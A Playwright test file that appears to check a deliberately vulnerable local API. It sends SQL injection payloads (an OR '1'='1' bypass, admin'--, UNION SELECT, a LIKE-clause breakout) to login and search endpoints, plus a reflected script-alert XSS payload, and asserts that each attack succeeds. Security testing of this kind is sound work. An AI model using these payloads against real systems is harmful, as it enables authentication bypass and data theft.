/* eslint-disable no-console */
import { test, expect } from '@playwright/test';

const API_URL = 'http://localhost:3000/api';

test.describe('/api/login', () => {
  test('POST SQL injection bypasses authentication', async ({ request }) => {
    const response = await request.post(`${API_URL}/login`, {
      data: {
        username: "admin' OR '1'='1'--",
        password: 'anything'
      }
    });
    
    expect(response.ok()).toBeTruthy();
    const data = await response.json();
    expect(data.success).toBeTruthy();
    expect(data.token).toBeTruthy();
    
    console.log('✓ SQL Injection successful - Authentication bypassed');
  });

  test('POST comment-based SQL injection with admin\'--', async ({ request }) => {
    const response = await request.post(`${API_URL}/login`, {
      data: {
        username: "admin'--",
        password: ''
      }
    });
    
    expect(response.ok()).toBeTruthy();
    const data = await response.json();
    expect(data.success).toBeTruthy();
    
    console.log('✓ Comment-based SQL injection successful');
  });

  test('POST UNION-based SQL injection attempt', async ({ request }) => {
    const response = await request.post(`${API_URL}/login`, {
      data: {
        username: "admin' UNION SELECT 1,2,3,4,5--",
        password: 'test'
      }
    });
    
    const data = await response.json();
    console.log('UNION injection response:', data);
  });
});

test.describe('/api/search', () => {
  test('GET search with SQL injection payload', async ({ request }) => {
    // `/api/search` is vulnerable to SQL injection via string concatenation in a LIKE clause.
    // Use a payload that closes the LIKE string and comments out the trailing `%`.
    const payload = "test%' OR '1'='1'--";
    const response = await request.get(`${API_URL}/search?q=${encodeURIComponent(payload)}`);
    expect(response.ok()).toBeTruthy();
    
    await response.json();
    console.log('Search injection executed');
  });

  test('GET search returns unsanitized XSS payload', async ({ request }) => {
    const xssPayload = '<script>alert("XSS")</script>';
    const response = await request.get(`${API_URL}/search?q=${encodeURIComponent(xssPayload)}`);
    
    const data = await response.json();
    expect(data.searchTerm).toBe(xssPayload);
    
    console.log('✓ XSS payload reflected unsanitized');
  });
});
